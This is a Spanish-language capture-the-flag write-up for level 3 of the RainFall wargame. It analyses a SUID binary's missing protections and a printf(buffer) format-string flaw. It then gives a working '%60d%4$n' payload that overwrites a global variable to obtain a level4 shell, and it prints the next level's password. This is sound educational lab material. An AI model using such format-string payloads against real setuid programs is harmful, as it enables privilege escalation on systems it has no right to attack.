# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level0' y sus permisos. 

```
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level4`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```
level3@RainFall:~$ file ./level3 
./level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

### b). ASLR:
```
level3@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```
level3@RainFall:~$ readelf -l ./level3 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```
level3@RainFall:~$ nm ./level3 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```
level3@RainFall:~$ readelf -S ./level3 | grep -E ".got|.plt"
  [10] .rel.plt          REL             08048314 000314 000030 08   A  5  12  4
  [12] .plt              PROGBITS        08048380 000380 000070 04  AX  0   0 16
  [22] .got              PROGBITS        08049814 000814 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049818 000818 000024 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

Probamos diferentes maneras de ejecutar el binario hasta lograr romperlo por tamaño de entrada::

```
level3@RainFall:~$ (printf 'A%.0s' {1..600};) | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
level3@RainFall:~$

```

* **Observación:** El binario no genera un `Segmentation fault` aunque enviemos mucha basura. Esto se debe a que utiliza la función `fgets()`, que tiene un límite estricto de lectura (visto en el ensamblador como 0x200, es decir, 512 bytes). El desbordamiento de buffer clásico es imposible aquí.. 

# 5. Reverse Engineering (Target Identification):

Análisis de la función v

```
0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200    ; Límite de 512 bytes para fgets
0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
...
0x080484d2 <+46>:    mov    DWORD PTR [esp],eax          ; Dirección del buffer
0x080484d5 <+49>:    call   0x8048390 <printf@plt>       ; VULNERABILIDAD: printf(buffer)
...
0x080484da <+54>:    mov    eax,ds:0x804988c             ; Carga variable 'm'
0x080484df <+59>:    cmp    eax,0x40                     ; Compara m con 64 (0x40)
0x080484e2 <+62>:    jne    0x8048518 <v+116>            ; Si no es 64, sale
```

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level3/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level3/source.c).

# 6. Solución: Format String Attack.

1. Tras analizar el desensamblado en el punto anterior, vemos que solo podemos atacar el binairo desde dentro de la función `v`.
```asm
0x08048520 <+6>:	call   0x80484a4 <v>  ⟸
0x08048525 <+11>  leave   
```

2. **Identificamos el BACKDOOR**
```asm
0x080484d2 <+46>:	   mov    DWORD PTR [esp],eax           ⟸
0x080484d5 <+49>:	   call   0x8048390 <printf@plt>
```

* línea <+49>: call 0x8048390 <printf@plt>.
* Justo antes, en <+46>, se mueve la dirección del buffer (eax) directamente al tope del stack como primer argumento de printf.

3. **Vulnerabilidad detectada:**
* Se está llamando a `printf(buffer)` en lugar de `printf("%s", buffer)`.
* Esto se conoce como **Format String Vulnerability**. ESto confirma que no podemos "romper" el buffer por tamaño **(buffer overflow)**, sino explotarlo cómo `printf` interpreta los datos.

```asm
0x080484da <+54>:    mov    eax,ds:0x804988c      ⟸
0x080484df <+59>:    cmp    eax,0x40
0x080484e2 <+62>:    jne    0x8048518 <v+116>
```

4. **Objetivo:** 

Nuestro objetivo es escribir el valor **64** en la dirección de memoria de la variable global `m` (`0x0804988c`).

1. **`\x8c\x98\x04\x08`**: Dirección de la variable `m`. Ocupa los primeros **4 bytes** del string.
2. **`%60d`**: Imprime un entero con un ancho de 60 caracteres. Esto genera **60 bytes** de salida.
3. **`%4$n`**: Toma el total de bytes escritos hasta ahora () y los escribe en la dirección apuntada por el 4º argumento del stack (que es nuestra dirección `0x0804988c`).

### **C) Ejecución**

```bash
level3@RainFall:~$ (printf "\x8c\x98\x04\x08"; printf "%%60d%%4\$n"; cat) | ./level3 
... (60 espacios) ...
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```

---

# **7. Conclusión:**

El **Level 3** marca un cambio de paradigma en el taller Rainfall. Mientras que los niveles 0, 1 y 2 se centraban en la corrupción de la memoria mediante el desbordamiento de buffers (*Buffer Overflow*), este nivel introduce la vulnerabilidad de **Cadena de Formato (Format String)**.

La seguridad del binario se ve comprometida por una implementación incorrecta de la función `printf`. Al pasar el buffer de usuario directamente como primer argumento (`printf(buffer)`) en lugar de usar un especificador de formato (`printf("%s", buffer)`), el programa otorga al atacante la capacidad de interactuar con la pila de forma imprevista.

Mediante el uso de especificadores como `%p`, logramos mapear la memoria y localizar nuestra propia entrada en el cuarto parámetro de la pila. El factor determinante para la resolución fue el uso del especificador `%n`, que en lugar de imprimir datos, **escribe** el número de bytes impresos hasta ese momento en una dirección de memoria proporcionada.

Al dirigir esta escritura hacia la variable global ubicada en `0x0804988c` y forzar un valor de **64** (0x40 en hexadecimal) mediante el ancho de campo de `printf` (`%60d` + 4 bytes de la dirección inicial), logramos manipular el flujo lógico del programa. Esto permitió evadir la instrucción `jne` (jump if not equal) y forzar la ejecución de la llamada a `system("/bin/sh")`, obteniendo así privilegios de **level4**.

